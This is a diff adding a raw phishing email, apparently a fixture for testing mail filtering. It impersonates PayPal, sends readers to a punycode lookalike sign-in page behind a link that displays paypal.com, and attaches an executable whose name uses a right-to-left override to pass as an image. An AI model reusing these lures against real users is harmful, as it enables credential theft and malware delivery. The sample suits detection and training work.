@@ -1,0 +1,29 @@
+From: "PayPal" <service@paypal.com>
+To: j.tan@acme-corp.com
+Subject: Your account has been limited
+Date: Thu, 24 Sep 2026 09:30:00 +0000
+Message-ID: <9456024624@mail.example.net>
+Authentication-Results: mx.corp.example.org; spf=fail
+ smtp.mailfrom=xn--pypal-4ve.com; dkim=fail; dmarc=fail
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============3238289024059760541=="
+
+--===============3238289024059760541==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+We noticed unusual activity. Sign in: https://xn--pypal-4ve.com/signin/verify
+
+--===============3238289024059760541==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body><p>We noticed unusual activity.</p>
+<p><a href=3D"https://xn--pypal-4ve.com/signin/verify">https://www.paypal.com=
+/signin</a></p>
+<p>File: <a href=3D"https://cdn-files.xyz/download/=E2=80=AEgpj.exe">Statemen=
+t</a></p></body></html>
+
+--===============3238289024059760541==--
